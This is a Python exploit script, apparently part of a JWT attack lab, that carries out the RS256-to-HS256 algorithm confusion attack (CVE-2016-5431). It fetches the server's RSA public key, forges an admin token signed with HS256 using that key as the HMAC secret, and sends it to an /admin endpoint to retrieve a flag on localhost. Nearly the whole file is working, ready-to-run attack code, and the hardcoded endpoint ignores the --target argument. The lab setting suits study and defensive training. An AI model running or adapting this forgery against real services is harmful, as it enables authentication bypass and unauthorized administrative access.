"""
=============================================================================
ATTACK 2: RS256 → HS256 Algorithm Confusion
=============================================================================
Person 2 — Offensive JWT Attack Toolkit

VULNERABILITY: CVE-2016-5431 / jwk-confusion
MITRE ATT&CK: T1550.001 - Use Alternate Authentication Material

DESCRIPTION:
  Asymmetric JWT (RS256) uses a private key to sign and a public key to verify.
  Some libraries, when given an HS256 token, use the PUBLIC key as the HMAC
  secret. Since the public key is openly available (JWKS endpoint, /public-key,
  certificates, source code, etc.), an attacker can:

    1. Fetch the server's RSA public key from /public-key
    2. Forge a JWT payload (e.g., role=admin)
    3. Sign it with HS256 using the PUBLIC KEY as the HMAC secret
    4. Send the token — the vulnerable server verifies it as HS256
       using the same public key → ACCEPTED!

  The server intended RS256 but the attacker switched to HS256 and
  the public key becomes both the signing key and the verification key.

USAGE:
    python alg_confusion.py --target http://localhost:5001

OUTCOME:
    Retrieves FLAG{jwt_bypass_success} from /admin
=============================================================================
"""

import sys
import json
import hmac
import hashlib
import argparse
import requests
from utils import (
    b64url_encode,
    b64url_decode,
    decode_jwt_parts,
    print_banner,
    print_success,
    print_error,
    print_info,
    print_token_diff,
)


def fetch_public_key(target: str) -> bytes:
    """
    Fetch the RSA public key from the /public-key endpoint.

    In real attacks this could come from:
      - /.well-known/jwks.json
      - /oauth/jwks
      - Hardcoded in client apps
      - SSL/TLS certificates
      - Open source code repositories

    Returns:
        Raw PEM bytes of the public key
    """
    print_info(f"Fetching public key from {target}/public-key ...")
    resp = requests.get(f"{target}/public-key", timeout=5)
    resp.raise_for_status()

    pem_str = resp.json()["public_key"]
    pem_bytes = pem_str.encode("utf-8")

    print_success(f"Public key obtained ({len(pem_bytes)} bytes)")
    print_info(pem_str)
    return pem_bytes


def forge_hs256_with_public_key(public_key_pem: bytes, payload: dict) -> str:
    """
    Forge a JWT signed with HS256 using the RSA PUBLIC key as HMAC secret.

    This is the core of the algorithm confusion attack:
      - We declare alg=HS256 in the header
      - We use the PUBLIC key (bytes) as the HMAC-SHA256 secret
      - The vulnerable server verifies using the same public key → match!

    Args:
        public_key_pem: RSA public key in PEM format (bytes)
        payload:        JWT claims to forge

    Returns:
        Forged JWT string
    """
    # Build header declaring HS256
    header = {"alg": "HS256", "typ": "JWT"}

    # Base64url encode header and payload
    h_enc = b64url_encode(json.dumps(header, separators=(",", ":")))
    p_enc = b64url_encode(json.dumps(payload, separators=(",", ":")))

    signing_input = f"{h_enc}.{p_enc}".encode("utf-8")

    # ── THE ATTACK: sign with PUBLIC KEY as HMAC secret
    # The public key PEM is used as the raw bytes secret for HMAC-SHA256
    signature = hmac.new(
        key=public_key_pem,          # ← RSA public key as HMAC secret!
        msg=signing_input,
        digestmod=hashlib.sha256,
    ).digest()

    sig_enc = b64url_encode(signature)
    forged_token = f"{h_enc}.{p_enc}.{sig_enc}"

    return forged_token


def run_attack(target: str, endpoint: str, set_claims: list) -> bool:
    """
    Full end-to-end RS256→HS256 confusion attack:
      1. Fetch public key from target
      2. Forge admin token (HS256, signed with public key)
      3. Submit to /admin endpoint

    Args:
        target: Base URL (e.g., http://localhost:5001)

    Returns:
        True if flag was captured
    """
    print_banner("ATTACK 2 — RS256 → HS256 Algorithm Confusion")

    # ── Phase 1: Fetch public key
    try:
        public_key_pem = fetch_public_key(target)
    except Exception as e:
        print_error(f"Failed to fetch public key: {e}")
        return False

    # ── Phase 2: Build and forge admin payload
    print_info("\nStep 2: Forging admin JWT (alg=HS256, secret=public_key)...")

    import time
    now = int(time.time())

    forged_payload = {
        "sub":  "hacker",
        "role": "admin",
        "iat":  now,
        "exp":  now + 3600,
        "iss":  "jwt-lab",
    }

    forged_token = forge_hs256_with_public_key(public_key_pem, forged_payload)

    print_info(f"Forged payload: {json.dumps(forged_payload, indent=2)}")
    print_info(f"\nForged token (HS256 signed with public key):")
    print_info(f"  {forged_token[:80]}...")

    # ── Phase 3: Access /admin
    print_info("\nStep 3: Sending forged token to /admin ...")
    try:
        resp = requests.get(
            endpoint,
            headers={"Authorization": f"Bearer {forged_token}"},
            timeout=5,
        )
    except requests.ConnectionError:
        print_error(f"Cannot connect to {target}")
        return False

    if resp.status_code == 200:
        data = resp.json()
        print_success("🚨 ATTACK SUCCESSFUL!")
        print_success(f"FLAG: {data.get('flag')}")
        print_success(f"Response: {json.dumps(data, indent=2)}")
        return True
    else:
        print_error(f"Attack failed ({resp.status_code}): {resp.text}")
        return False


# ─────────────────────────────────────────────────────────────
# CLI Entry Point
# ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="RS256→HS256 algorithm confusion attack — CVE-2016-5431",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python alg_confusion.py
  python alg_confusion.py --target http://localhost:5001
        """,
    )
    parser.add_argument("--target", default="http://localhost:5001", help="API base URL")

    args = parser.parse_args()
    success = run_attack(args.target, "http://localhost:5001/admin/vulnerable", [])
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
